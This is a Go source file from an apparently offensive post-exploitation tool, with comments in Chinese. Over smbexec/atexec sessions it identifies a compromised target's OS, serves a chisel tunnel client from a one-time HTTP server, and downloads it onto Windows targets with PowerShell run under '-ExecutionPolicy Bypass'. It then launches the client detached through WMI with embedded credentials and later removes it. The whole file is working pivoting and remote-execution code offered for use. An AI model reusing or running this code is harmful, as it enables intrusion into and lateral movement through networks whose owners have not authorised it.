package tunnel

// 跨 OS/架构适配：平台侧 chisel server 与目标侧 client 分离选择，
// 并根据目标平台生成交付/启动/巡检/清理命令。Windows 目标用内联 PowerShell
// （无脚本 WriteFile、无多引号），避免 SMB/atexec 的 cmd 包装与 GBK 解码问题。

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/artex/session"
)

const platformProbeTimeout = 8 * time.Second

func normalizeOSName(raw string) string {
	low := strings.ToLower(strings.TrimSpace(raw))
	if strings.HasPrefix(low, "mingw") || strings.HasPrefix(low, "msys") || strings.HasPrefix(low, "cygwin") {
		return "windows"
	}
	switch low {
	case "linux":
		return "linux"
	case "darwin":
		return "darwin"
	case "windows", "windows_nt", "win32", "winnt":
		return "windows"
	case "freebsd":
		return "freebsd"
	}
	return ""
}

func normalizeArchName(raw string) string {
	s := strings.ToLower(strings.TrimSpace(raw))
	switch {
	case strings.Contains(s, "aarch64"), strings.Contains(s, "arm64"):
		return "arm64"
	case strings.Contains(s, "x86_64"), strings.Contains(s, "amd64"):
		return "amd64"
	case strings.Contains(s, "i386"), strings.Contains(s, "i686"), s == "x86":
		return "386"
	case strings.Contains(s, "armv7"), strings.Contains(s, "armv6"):
		return "arm"
	}
	return ""
}

func nonEmptyLines(s string) []string {
	out := make([]string, 0, 4)
	for _, ln := range strings.Split(s, "\n") {
		if v := strings.TrimSpace(ln); v != "" {
			out = append(out, v)
		}
	}
	return out
}

func parseUnameProbe(out string) (string, string) {
	lines := nonEmptyLines(out)
	if len(lines) < 2 {
		return "", ""
	}
	return normalizeOSName(lines[0]), normalizeArchName(lines[1])
}

func parseWindowsProbe(out string) (string, string) {
	var osName, arch string
	for _, ln := range nonEmptyLines(out) {
		low := strings.ToLower(ln)
		if osName == "" && (strings.Contains(low, "windows") || strings.Contains(low, "win32") || strings.Contains(low, "winnt")) {
			osName = "windows"
			continue
		}
		if arch == "" {
			if a := normalizeArchName(ln); a != "" {
				arch = a
			}
		}
	}
	if osName != "" && arch == "" {
		arch = "amd64"
	}
	return osName, arch
}

// detectTargetPlatform 通过会话探测目标 OS/架构；探测失败返回空（调用方决定 legacy/报错）。
func detectTargetPlatform(ctx context.Context, sess session.Session) (string, string) {
	if out, _, err := sess.Exec(ctx, "uname -s; uname -m", platformProbeTimeout); err == nil {
		if o, a := parseUnameProbe(out); o != "" && a != "" {
			return o, a
		}
	}
	if out, _, err := sess.Exec(ctx, "echo %OS% & echo %PROCESSOR_ARCHITECTURE%", platformProbeTimeout); err == nil {
		if o, a := parseWindowsProbe(out); o != "" {
			return o, a
		}
	}
	if strings.Contains(strings.ToLower(sess.Kind()), "smb") {
		return "windows", "amd64"
	}
	return "", ""
}

func windowsExeSuffix(osName string) string {
	if osName == "windows" {
		return ".exe"
	}
	return ""
}

// clientBinaryFor 为目标平台选择要上传的 chisel client 二进制。
// 未指定 TargetOS 时沿用旧行为（同一 ChiselPath）；否则优先 client 目录，
// 同平台同架构再回退 ChiselPath，跨平台但无匹配则明确报错。
func (m *Manager) clientBinaryFor(p *Plan) (string, error) {
	if p.TargetOS == "" {
		return m.chiselPath, nil
	}
	if p.TargetArch == "" {
		return "", fmt.Errorf("目标架构未知（%s），无法选择 chisel client", p.TargetOS)
	}
	if m.chiselClientDir != "" {
		base := "chisel" + windowsExeSuffix(p.TargetOS)
		candidates := []string{
			filepath.Join(m.chiselClientDir, p.TargetOS+"-"+p.TargetArch, base),
			filepath.Join(m.chiselClientDir, "chisel-"+p.TargetOS+"-"+p.TargetArch+windowsExeSuffix(p.TargetOS)),
			filepath.Join(m.chiselClientDir, p.TargetOS, p.TargetArch, base),
		}
		for _, c := range candidates {
			if st, err := os.Stat(c); err == nil && !st.IsDir() {
				return c, nil
			}
		}
	}
	if p.TargetOS == runtime.GOOS && p.TargetArch == runtime.GOARCH && m.chiselPath != "" {
		return m.chiselPath, nil
	}
	return "", fmt.Errorf("缺少目标平台 %s/%s 的 chisel client 二进制：请放到 %s 或设 ARTEX_CHISEL_CLIENT_DIR（平台侧 server 用 ARTEX_CHISEL_PATH）",
		p.TargetOS, p.TargetArch, m.chiselClientDir)
}

// adaptWindowsPlan 把 Unix 风格远端路径改写成 Windows 临时目录（路径不含空格）。
func adaptWindowsPlan(p *Plan) {
	base := filepath.Base(p.RemoteDir)
	if base == "" || base == "." || base == "/" || base == "\\" {
		base = ".artex-win"
	}
	dir := "C:\\Windows\\Temp\\" + base
	p.RemoteDir = dir
	p.RemoteBin = dir + "\\ch.exe"
	p.RemoteLog = dir + "\\run.log"
}

// windowsPS 生成内联 PowerShell；强制 UTF-8 输出，避免 atexec.py 按 UTF-8
// 解码 GBK 本地化错误时报 codec 失败。
func windowsPS(cmd string) string {
	return "powershell -NoProfile -ExecutionPolicy Bypass -Command $OutputEncoding=[Console]::OutputEncoding=[Text.Encoding]::UTF8; " + cmd
}

func windowsMkdirCommand(dir string) string {
	return windowsPS("New-Item -ItemType Directory -Force -Path " + dir + "; 'ARTEX_MKDIR_OK'")
}

func windowsRemoveDirCommand(dir string) string {
	return windowsPS("Remove-Item -LiteralPath " + dir + " -Recurse -Force -ErrorAction SilentlyContinue")
}

func windowsKillCommand(pid int) string {
	return windowsPS("Stop-Process -Id " + fmt.Sprint(pid) + " -Force")
}

func windowsDownloadCommand(url, bin string) string {
	return windowsPS("$ProgressPreference='SilentlyContinue'; try { Invoke-WebRequest -Uri '" + url + "' -OutFile '" + bin + "' -UseBasicParsing; if (Test-Path '" + bin + "') { 'ARTEX_DL_OK' } else { 'ARTEX_DL_FAIL' } } catch { 'ARTEX_DL_FAIL ' + $_.Exception.Message }")
}

func windowsSpawnCommand(p *Plan) string {
	// Start-Process 在 atexec/交互式命令下会让 atexec 等子进程句柄到超时；
	// 改用 WMI Win32_Process.Create：立即返回 PID，进程完全脱离会话。
	args := []string{"client", "--auth", p.AuthUser + ":" + p.AuthPass}
	args = append(args, p.ClientArgs[1:]...)
	quoted := make([]string, 0, len(args))
	for _, a := range args {
		quoted = append(quoted, a)
	}
	cmd := "$q=[char]34; $exe=$q+'" + strings.ReplaceAll(p.RemoteBin, "'", "''") + "'+$q; " +
		"$r=Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=($exe+' " + strings.Join(quoted, " ") + "')}; " +
		"'ARTEX_PID=' + $r.ProcessId"
	return windowsPS(cmd)
}

func windowsPrecheckCommand(host string, port int) string {
	return windowsPS("$c=New-Object Net.Sockets.TcpClient;try{$c.Connect('" + host + "'," + fmt.Sprint(port) + ");'ARTEX_PRE_OK'}catch{'ARTEX_PRE_FAIL'}finally{$c.Close()}")
}

func windowsProcCheckCommand(pid int, binHint string) string {
	return windowsPS("$p=Get-CimInstance Win32_Process -Filter ProcessId=" + fmt.Sprint(pid) +
		"; if($p -and $p.ExecutablePath -like '*" + strings.ReplaceAll(binHint, "'", "''") + "*'){'ARTEX_PROC_OK'}else{'ARTEX_NO_PROC'}")
}

// prepareTarget 识别目标平台并选定目标端二进制（不写台账前完成，失败不动台账）。
func (m *Manager) prepareTarget(ctx context.Context, sess session.Session, p *Plan) error {
	if p.TargetOS == "" {
		o, a := detectTargetPlatform(ctx, sess)
		if o != "" {
			p.TargetOS, p.TargetArch = o, a
		}
	}
	if p.TargetOS != "" {
		bin, err := m.clientBinaryFor(p)
		if err != nil {
			return err
		}
		p.ClientBinary = bin
		if p.TargetOS == "windows" {
			adaptWindowsPlan(p)
		}
		return nil
	}
	if m.chiselClientDir != "" {
		return fmt.Errorf("已配置 ARTEX_CHISEL_CLIENT_DIR，但无法识别目标 OS/架构；请先确认会话命令可执行（smbexec 会话默认按 Windows/amd64 处理）")
	}
	// 保持旧行为：无法探测时使用同一 ChiselPath（兼容既有部署）。
	return nil
}

// deliverWindows Windows 目标走平台临时 HTTP 一次性下载（目标自带 PowerShell）；
// 下载失败直接报错（不再回退 12MB 的 SMB 分块写入，实测不可用）。
func (m *Manager) deliverWindows(ctx context.Context, sess session.Session, p *Plan) error {
	client := p.ClientBinary
	if client == "" {
		bin, err := m.clientBinaryFor(p)
		if err != nil {
			return err
		}
		client = bin
	}
	data, err := os.ReadFile(client)
	if err != nil {
		return fmt.Errorf("读取目标端 chisel 失败: %w", err)
	}
	mkdirOut, _, err := sess.Exec(ctx, windowsMkdirCommand(p.RemoteDir), probeTimeout)
	if err != nil || !strings.Contains(mkdirOut, "ARTEX_MKDIR_OK") {
		return fmt.Errorf("Windows 目录创建失败: %v %s", err, detailOf(mkdirOut))
	}
	name := p.RemoteBin
	if i := strings.LastIndexAny(name, "/\\"); i >= 0 {
		name = name[i+1:]
	}
	dlURL, stop, derr := m.serveBinaryOnce(ctx, p, data, name)
	if derr != nil {
		return derr
	}
	defer stop()
	out, _, xerr := sess.Exec(ctx, windowsDownloadCommand(dlURL, p.RemoteBin), remoteExecWait)
	if xerr != nil || !strings.Contains(out, "ARTEX_DL_OK") {
		return fmt.Errorf("Windows 下载失败: %v %s", xerr, detailOf(out))
	}
	return nil
}

// spawnRemoteWindows 用内联 PowerShell 后台拉起 chisel client，并从输出取 PID。
func (m *Manager) spawnRemoteWindows(ctx context.Context, sess session.Session, p *Plan) (int, error) {
	if len(p.ClientArgs) == 0 {
		return 0, fmt.Errorf("Windows spawn 缺少 client 参数")
	}
	stdout, _, err := sess.Exec(ctx, windowsSpawnCommand(p), remoteExecWait)
	if err != nil {
		return 0, fmt.Errorf("Windows 拉起命令失败: %w", err)
	}
	logTail := ""
	if b, rerr := sess.ReadFile(ctx, p.RemoteLog); rerr == nil && len(b) > 0 {
		logTail = clipTunnelText(string(b), 500)
	}
	if strings.Contains(stdout, "ARTEX_PID_FAIL") {
		return 0, fmt.Errorf("Windows client 启动失败: %s %s", detailOf(stdout), logTail)
	}
	_, after, found := strings.Cut(stdout, "ARTEX_PID=")
	if !found {
		return 0, fmt.Errorf("未取到 Windows 远端 pid（哨兵缺失）: %s %s", detailOf(stdout), logTail)
	}
	fields := strings.Fields(after)
	if len(fields) == 0 {
		return 0, fmt.Errorf("Windows 远端 pid 解析失败: %s", detailOf(stdout))
	}
	pid, err := strconv.Atoi(strings.TrimSpace(fields[0]))
	if err != nil || pid <= 0 {
		return 0, fmt.Errorf("Windows 远端 pid 非法 %q", fields[0])
	}
	log.Printf("[tunnel] Windows client pid=%d", pid)
	return pid, nil
}

// killRemoteWindows 核对 pid 对应可执行路径后再杀（防 pid 复用）。
func (m *Manager) killRemoteWindows(ctx context.Context, sess session.Session, p *Plan) {
	binHint := filepath.Base(p.RemoteBin)
	stdout, _, err := sess.Exec(ctx, windowsProcCheckCommand(p.RemotePID, binHint), probeTimeout)
	if err != nil || strings.Contains(stdout, "ARTEX_NO_PROC") || !strings.Contains(stdout, "ARTEX_PROC_OK") {
		return
	}
	_, _, _ = sess.Exec(ctx, windowsKillCommand(p.RemotePID), probeTimeout)
}

// serveBinaryOnce 在平台侧临时起一个单次下载服务（目标回连地址可达的端口），
// 供目标用 PowerShell 拉取 bootstrap 二进制，下载完成或超时即关闭。
func (m *Manager) serveBinaryOnce(ctx context.Context, p *Plan, data []byte, filename string) (string, func(), error) {
	ln, err := net.Listen("tcp", "0.0.0.0:0")
	if err != nil {
		return "", nil, fmt.Errorf("临时下载服务监听失败: %w", err)
	}
	host, _, err := net.SplitHostPort(p.PlatformAddr)
	if err != nil || host == "" || host == "0.0.0.0" {
		host = "127.0.0.1"
	}
	token, err := randToken(16)
	if err != nil {
		_ = ln.Close()
		return "", nil, err
	}
	path := "/" + token + "/" + filename
	downloaded := make(chan struct{}, 1)
	mux := http.NewServeMux()
	mux.HandleFunc(path, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Length", strconv.Itoa(len(data)))
		_, _ = w.Write(data)
		select {
		case downloaded <- struct{}{}:
		default:
		}
	})
	srv := &http.Server{Handler: mux, ReadHeaderTimeout: 5 * time.Second}
	go func() { _ = srv.Serve(ln) }()
	stop := func() {
		_ = srv.Close()
		_ = ln.Close()
	}
	go func() {
		select {
		case <-downloaded:
		case <-ctx.Done():
		case <-time.After(45 * time.Second):
		}
		stop()
	}()
	port := ln.Addr().(*net.TCPAddr).Port
	return "http://" + net.JoinHostPort(host, strconv.Itoa(port)) + path, stop, nil
}

func randToken(n int) (string, error) {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

func clipTunnelText(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}
